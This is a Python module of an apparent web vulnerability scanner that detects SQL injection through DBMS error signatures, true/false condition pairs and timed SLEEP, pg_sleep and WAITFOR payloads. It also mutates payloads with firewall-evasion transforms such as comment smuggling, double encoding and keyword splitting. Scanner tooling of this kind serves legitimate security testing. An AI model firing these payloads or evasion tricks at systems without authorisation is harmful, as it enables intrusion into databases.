"""SQL injection detection engine.

Techniques:
  * error-based  — DBMS error signatures triggered by quote probes
  * boolean-blind — true/false condition pairs compared against a baseline
  * time-based   — SLEEP / pg_sleep / WAITFOR payloads measured against a threshold

Every base payload can be run through WAF-evasion transforms
(case games, comment smuggling, encoding, keyword splitting, ...).
A finding records which transform bypassed the filter, if any.
"""

from __future__ import annotations

import difflib
import random
import re

from .http import Session, send_point

# ---------------------------------------------------------------------------
# Error signatures: (dbms, regex)
# ---------------------------------------------------------------------------
ERROR_SIGNATURES = [
    ("MySQL", r"you have an error in your sql syntax"),
    ("MySQL", r"warning:\s*mysql"),
    ("MySQL", r"mysqli?_[a-z_]+\(\)"),
    ("MySQL", r"valid mysql result"),
    ("MySQL", r"mysql server version"),
    ("MariaDB", r"mariadb server version"),
    ("PostgreSQL", r"pg_query\(\)"),
    ("PostgreSQL", r"pg_exec\(\)"),
    ("PostgreSQL", r"unterminated quoted string"),
    ("PostgreSQL", r"postgresql.+error"),
    ("PostgreSQL", r"warning.+pg_"),
    ("MSSQL", r"unclosed quotation mark"),
    ("MSSQL", r"microsoft ole db provider for sql server"),
    ("MSSQL", r"odbc sql server driver"),
    ("MSSQL", r"sqlstate[\s\[]+[0-9a-z]+", ),
    ("Oracle", r"ora-01756"),
    ("Oracle", r"ora-00933"),
    ("Oracle", r"quoted string not properly terminated"),
    ("Oracle", r"oracle error"),
    ("SQLite", r"sqlite3?::"),
    ("SQLite", r"sqlite error"),
    ("SQLite", r"near .+ syntax error"),
    ("Generic", r"sql syntax"),
    ("Generic", r"database error"),
    ("Generic", r"db error"),
    ("Generic", r"syntax error.+query"),
]

# ---------------------------------------------------------------------------
# Base payloads
# ---------------------------------------------------------------------------
ERROR_PROBES = [
    "'",
    '"',
    "')",
    '")',
    "'))",
    "' OR '1'='1",
    '" OR "1"="1',
    "' OR 1=1-- -",
]

BOOLEAN_PAIRS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("' AND 1=1-- -", "' AND 1=2-- -"),
    ('" AND "1"="1', '" AND "1"="2'),
    ("' AND 1=1#", "' AND 1=2#"),
]


def time_payloads(delay: int):
    """(dbms, payload template) — {d} is the sleep duration in seconds."""
    return [
        ("MySQL", f"' AND SLEEP({delay})-- -"),
        ("MySQL", f"' OR SLEEP({delay})-- -"),
        ("PostgreSQL", f"' AND pg_sleep({delay})-- -"),
        ("PostgreSQL", f"'; SELECT pg_sleep({delay})-- -"),
        ("MSSQL", f"'; WAITFOR DELAY '0:0:{delay}'-- -"),
        ("MSSQL", f"' AND 1=1; WAITFOR DELAY '0:0:{delay}'-- -"),
    ]


# ---------------------------------------------------------------------------
# WAF-evasion transforms: name -> function(payload) -> payload
# ---------------------------------------------------------------------------
def _randomcase(p: str) -> str:
    return "".join(c.upper() if random.random() < 0.5 else c.lower() for c in p)


def _space2comment(p: str) -> str:
    return p.replace(" ", "/**/")


def _tabspace(p: str) -> str:
    return p.replace(" ", "%09")


def _newlinespace(p: str) -> str:
    return p.replace(" ", "%0A")


def _charencode(p: str) -> str:
    return "".join(c if c.isalnum() else "%%%02X" % ord(c) for c in p)


def _doubleencode(p: str) -> str:
    once = _charencode(p)
    return once.replace("%", "%25")


def _versioned(p: str) -> str:
    out = p
    for kw in ("UNION", "SELECT", "AND", "OR", "FROM", "WHERE", "SLEEP"):
        out = re.sub(r"(?i)\b" + kw + r"\b", f"/*!50000{kw}*/", out)
    return out


def _nullbyte(p: str) -> str:
    return p + "%00"


def _keywordsplit(p: str) -> str:
    out = p
    for kw, split in (("UNION", "UN/**/ION"), ("SELECT", "SEL/**/ECT"),
                      ("AND", "A/**/ND"), ("OR", "O/**/R"),
                      ("FROM", "F/**/ROM"), ("WHERE", "W/**/HERE"),
                      ("SLEEP", "SL/**/EEP")):
        out = re.sub(r"(?i)\b" + kw + r"\b", split, out)
    return out


TRANSFORMS = {
    "randomcase": _randomcase,
    "space2comment": _space2comment,
    "tabspace": _tabspace,
    "newlinespace": _newlinespace,
    "charencode": _charencode,
    "doubleencode": _doubleencode,
    "versioned-comments": _versioned,
    "nullbyte": _nullbyte,
    "keyword-split": _keywordsplit,
}

# level -> transform names applied on top of base payloads
LEVEL_TRANSFORMS = {
    1: [],
    2: ["randomcase", "space2comment", "tabspace", "charencode"],
    3: ["randomcase", "space2comment", "tabspace", "newlinespace",
        "charencode", "doubleencode", "versioned-comments",
        "nullbyte", "keyword-split"],
}


def expand(payloads, level: int):
    """Yield (payload, transform_name_or_None), deduplicated."""
    seen = set()
    for base in payloads:
        if base not in seen:
            seen.add(base)
            yield base, None
        for name in LEVEL_TRANSFORMS.get(level, []):
            try:
                mutated = TRANSFORMS[name](base)
            except Exception:
                continue
            if mutated != base and mutated not in seen:
                seen.add(mutated)
                yield mutated, name


# ---------------------------------------------------------------------------
# Detection
# ---------------------------------------------------------------------------
def _match_error(text: str):
    for dbms, pattern in ERROR_SIGNATURES:
        m = re.search(pattern, text, re.IGNORECASE)
        if m:
            start = max(0, m.start() - 60)
            return dbms, text[start:m.end() + 60].strip().replace("\n", " ")
    return None


def _similar(a: str, b: str) -> bool:
    if a == b:
        return True
    if not a or not b:
        return False
    if abs(len(a) - len(b)) > max(len(a), len(b)) * 0.05:
        return False
    return difflib.SequenceMatcher(None, a, b).quick_ratio() > 0.97


def _finding(point, name, technique, payload, transform, severity, extra=None):
    f = {
        "type": "sqli",
        "technique": technique,
        "severity": severity,
        "method": point["method"],
        "url": point["url"],
        "parameter": name,
        "payload": payload,
        "evasion": transform,
    }
    if extra:
        f.update(extra)
    return f


def scan_point(session: Session, point: dict, name: str,
               level: int = 1, time_delay: int = 5) -> list:
    """Test one parameter; return a list of findings."""
    findings = []
    baseline = send_point(session, point, name, "aegis0")

    # --- 1. error-based ----------------------------------------------------
    for payload, transform in expand(ERROR_PROBES, level):
        resp = send_point(session, point, name, payload)
        hit = _match_error(resp.text)
        if hit:
            dbms, evidence = hit
            findings.append(_finding(
                point, name, "error-based", payload, transform, "High",
                {"dbms": dbms, "evidence": evidence[:200]}))
            break

    # --- 2. boolean-blind ---------------------------------------------------
    for true_p, false_p in BOOLEAN_PAIRS:
        variants = [(true_p, false_p, None)]
        for tname in LEVEL_TRANSFORMS.get(level, []):
            try:
                variants.append((TRANSFORMS[tname](true_p),
                                 TRANSFORMS[tname](false_p), tname))
            except Exception:
                continue
        done = False
        for tp, fp, tname in variants:
            if tp == fp:
                continue
            t_resp = send_point(session, point, name, tp)
            f_resp = send_point(session, point, name, fp)
            if (_similar(t_resp.text, baseline.text)
                    and not _similar(f_resp.text, baseline.text)
                    and not _similar(t_resp.text, f_resp.text)):
                findings.append(_finding(
                    point, name, "boolean-blind", tp, tname, "High",
                    {"dbms": "Unknown"}))
                done = True
                break
        if done:
            break

    # --- 3. time-based -------------------------------------------------------
    threshold = max(1.0, time_delay * 0.75)
    for dbms, payload in time_payloads(time_delay):
        for mutated, transform in expand([payload], level):
            resp = send_point(session, point, name, mutated)
            if resp.elapsed - baseline.elapsed >= threshold:
                findings.append(_finding(
                    point, name, "time-based", mutated, transform, "High",
                    {"dbms": dbms,
                     "evidence": f"response delayed {resp.elapsed:.1f}s "
                                 f"(baseline {baseline.elapsed:.1f}s)"}))
                break
        else:
            continue
        break

    return findings
